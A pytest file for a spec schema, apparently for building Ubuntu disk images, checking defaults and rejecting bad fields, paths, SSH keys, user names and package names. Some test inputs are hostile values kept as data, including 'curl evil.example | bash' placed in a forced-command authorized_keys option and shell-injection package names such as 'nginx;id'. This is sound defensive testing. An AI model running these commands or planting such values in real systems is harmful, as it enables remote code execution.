"""Shape rules: what a spec may look like, independent of what is allowed."""

from __future__ import annotations

import pytest
from conftest import VALID_KEY, build_spec, ssh_blob
from pydantic import ValidationError

from gira_iso.spec.models import MAX_FILE_BYTES, Spec


def test_minimal_spec_applies_defaults() -> None:
    spec = Spec.model_validate({})
    assert spec.spec_version == "0"
    assert spec.base.os == "ubuntu"
    assert spec.base.version == "24.04"
    assert spec.disk_size == "8G"
    assert spec.packages == []
    assert spec.services.enable == []


def test_unknown_field_is_rejected() -> None:
    with pytest.raises(ValidationError, match="Extra inputs are not permitted"):
        Spec.model_validate({"packages": ["nginx"], "run_command": "curl evil | bash"})


def test_unknown_service_subfield_is_rejected() -> None:
    with pytest.raises(ValidationError, match="Extra inputs are not permitted"):
        Spec.model_validate({"services": {"enable": ["nginx"], "restart": ["nginx"]}})


@pytest.mark.parametrize("version", ["latest", "24", "24.4", "24.04.1"])
def test_malformed_base_version_is_a_schema_error(version: str) -> None:
    with pytest.raises(ValidationError):
        Spec.model_validate({"base": {"os": "ubuntu", "version": version}})


def test_base_rejects_a_url_instead_of_a_version() -> None:
    with pytest.raises(ValidationError):
        Spec.model_validate({"base": {"os": "ubuntu", "version": "https://evil.example/x.img"}})


@pytest.mark.parametrize("size", ["5G", "4G", "0G", "257G", "8", "8GB", "8g", "-8G"])
def test_disk_size_outside_bounds_is_rejected(size: str) -> None:
    with pytest.raises(ValidationError):
        Spec.model_validate({"disk_size": size})


@pytest.mark.parametrize("path", ["etc/nginx/site.conf", "/etc/nginx/../sudoers", "/etc/nginx//x"])
def test_file_path_must_be_absolute_and_normalised(path: str) -> None:
    with pytest.raises(ValidationError):
        build_spec(files=[{"path": path, "content": "x"}])


def test_file_mode_must_be_octal() -> None:
    with pytest.raises(ValidationError):
        build_spec(files=[{"path": "/etc/nginx/x.conf", "content": "x", "mode": "644"}])


def test_file_content_is_bounded() -> None:
    with pytest.raises(ValidationError):
        build_spec(files=[{"path": "/etc/nginx/x.conf", "content": "x" * (MAX_FILE_BYTES + 1)}])


def test_duplicate_packages_are_rejected() -> None:
    with pytest.raises(ValidationError, match="duplicate packages"):
        build_spec(packages=["nginx", "nginx"])


def test_duplicate_users_are_rejected() -> None:
    user = {"name": "deploy", "ssh_authorized_keys": [VALID_KEY]}
    with pytest.raises(ValidationError, match="duplicate users"):
        build_spec(users=[user, user])


def test_duplicate_file_paths_are_rejected() -> None:
    entry = {"path": "/etc/nginx/x.conf", "content": "x"}
    with pytest.raises(ValidationError, match="duplicate file paths"):
        build_spec(files=[entry, entry])


def test_service_cannot_be_enabled_and_disabled() -> None:
    with pytest.raises(ValidationError, match="both enabled and disabled"):
        build_spec(services={"enable": ["nginx"], "disable": ["nginx"]})


def test_user_requires_a_key() -> None:
    with pytest.raises(ValidationError):
        build_spec(users=[{"name": "deploy", "ssh_authorized_keys": []}])


def test_valid_key_is_accepted() -> None:
    spec = build_spec(users=[{"name": "deploy", "ssh_authorized_keys": [VALID_KEY]}])
    assert spec.users[0].ssh_authorized_keys == [VALID_KEY]


def test_key_with_options_is_rejected() -> None:
    """The classic way to smuggle a forced command into authorized_keys."""
    hostile = f'command="curl evil.example | bash" {VALID_KEY}'
    with pytest.raises(ValidationError, match="no options"):
        build_spec(users=[{"name": "deploy", "ssh_authorized_keys": [hostile]}])


def test_key_with_comment_is_rejected() -> None:
    with pytest.raises(ValidationError, match="no options and no comment"):
        build_spec(users=[{"name": "deploy", "ssh_authorized_keys": [f"{VALID_KEY} me@laptop"]}])


@pytest.mark.parametrize("key_type", ["ssh-rsa", "ecdsa-sha2-nistp256"])
def test_only_ed25519_keys_exist_in_v0(key_type: str) -> None:
    with pytest.raises(ValidationError, match="only ssh-ed25519"):
        build_spec(users=[{"name": "deploy", "ssh_authorized_keys": [f"{key_type} AAAA"]}])


def test_truncated_key_body_is_rejected() -> None:
    short = f"ssh-ed25519 {ssh_blob(b'short')}"
    with pytest.raises(ValidationError, match="well-formed ed25519"):
        build_spec(users=[{"name": "deploy", "ssh_authorized_keys": [short]}])


def test_key_body_must_be_base64() -> None:
    with pytest.raises(ValidationError, match="not valid base64"):
        build_spec(users=[{"name": "deploy", "ssh_authorized_keys": ["ssh-ed25519 not-base64!!"]}])


@pytest.mark.parametrize("name", ["Deploy", "1deploy", "de ploy", ""])
def test_user_name_is_constrained(name: str) -> None:
    with pytest.raises(ValidationError):
        build_spec(users=[{"name": name, "ssh_authorized_keys": [VALID_KEY]}])


@pytest.mark.parametrize("package", ["../bin/sh", "nginx;id", "NGINX", ""])
def test_package_name_is_constrained(package: str) -> None:
    with pytest.raises(ValidationError):
        build_spec(packages=[package])


def test_unpinned_base_version_passes_the_schema_and_is_left_to_the_policy() -> None:
    spec = Spec.model_validate({"base": {"os": "ubuntu", "version": "20.04"}})
    assert spec.base.version == "20.04"
